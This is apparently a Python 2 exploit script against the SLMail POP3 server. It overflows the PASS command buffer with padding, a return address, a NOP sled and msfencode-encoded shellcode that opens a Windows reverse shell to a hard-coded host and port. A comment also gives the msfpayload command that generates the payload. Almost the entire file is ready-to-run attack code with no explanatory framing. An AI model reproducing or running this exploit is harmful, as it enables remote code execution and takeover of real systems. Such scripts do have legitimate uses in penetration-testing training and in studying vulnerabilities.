#Author:	Aaron Huber
#Date:		5/2015

#The following python script uses a buffer overflow to obtain a reverse shell on an slmail server

import sys
import socket

ip = sys.argv[1]
port = int(sys.argv[2])


#msfpayload windows/shell_reverse_tcp EXITFUNC=thread LHOST=10.167.6.5 LPORT=8421 R | msfencode -e x86/shikata_ga_nai
#-b "\x00\x0a\x0d" -t python

buf =  ""
buf += "\xdd\xc5\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x4f\xba\xae"
buf += "\xeb\xb8\x9a\x31\x50\x19\x03\x50\x19\x83\xe8\xfc\x4c"
buf += "\x1e\x44\x72\x19\xe1\xb5\x83\x79\x6b\x50\xb2\xab\x0f"
buf += "\x10\xe7\x7b\x5b\x74\x04\xf0\x09\x6d\x9f\x74\x86\x82"
buf += "\x28\x32\xf0\xad\xa9\xf3\x3c\x61\x69\x92\xc0\x78\xbe"
buf += "\x74\xf8\xb2\xb3\x75\x3d\xae\x3c\x27\x96\xa4\xef\xd7"
buf += "\x93\xf9\x33\xd6\x73\x76\x0b\xa0\xf6\x49\xf8\x1a\xf8"
buf += "\x99\x51\x11\xb2\x01\xd9\x7d\x63\x33\x0e\x9e\x5f\x7a"
buf += "\x3b\x54\x2b\x7d\xed\xa5\xd4\x4f\xd1\x69\xeb\x7f\xdc"
buf += "\x70\x2b\x47\x3f\x07\x47\xbb\xc2\x1f\x9c\xc1\x18\xaa"
buf += "\x01\x61\xea\x0c\xe2\x93\x3f\xca\x61\x9f\xf4\x99\x2e"
buf += "\xbc\x0b\x4e\x45\xb8\x80\x71\x8a\x48\xd2\x55\x0e\x10"
buf += "\x80\xf4\x17\xfc\x67\x09\x47\x58\xd7\xaf\x03\x4b\x0c"
buf += "\xc9\x49\x04\xe1\xe7\x71\xd4\x6d\x70\x01\xe6\x32\x2a"
buf += "\x8d\x4a\xba\xf4\x4a\xac\x91\x40\xc4\x53\x1a\xb0\xcc"
buf += "\x97\x4e\xe0\x66\x31\xef\x6b\x77\xbe\x3a\x3b\x27\x10"
buf += "\x95\xfb\x97\xd0\x45\x93\xfd\xde\xba\x83\xfd\x34\xcd"
buf += "\x84\x6a\xbd\x69\x0c\x6e\xa9\x77\x10\x50\xcc\xf1\xf6"
buf += "\xfa\x1e\x54\xa1\x92\x87\xfd\x39\x02\x47\x28\xa9\xa7"
buf += "\xda\xb7\x29\xa1\xc6\x6f\x7e\xe6\x39\x66\xea\x1a\x63"
buf += "\xd0\x08\xe7\xf5\x1b\x88\x3c\xc6\xa2\x11\xb0\x72\x81"
buf += "\x01\x0c\x7a\x8d\x75\xc0\x2d\x5b\x23\xa6\x87\x2d\x9d"
buf += "\x70\x7b\xe4\x49\x04\xb7\x37\x0f\x09\x92\xc1\xef\xb8"
buf += "\x4b\x94\x10\x74\x1c\x10\x69\x68\xbc\xdf\xa0\x28\xdc"
buf += "\x3d\x60\x45\x75\x98\xe1\xe4\x18\x1b\xdc\x2b\x25\x98"
buf += "\xd4\xd3\xd2\x80\x9d\xd6\x9f\x06\x4e\xab\xb0\xe2\x70"
buf += "\x18\xb0\x26"



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((ip, port))
banner = s.recv(4096)
print banner

try:
	s.send('USER username' + '\r\n')
	data = s.recv(4096)
	pwd = 'PASS ' + "A"*2606 + "\x8f\x35\x4a\x5f"+ "\x90"*16 + buf + "\r\n"
	s.send(pwd)
	data = s.recv(4096)
	
except:
	print "****************"
	print "TANGO DOWN"
	print "****************"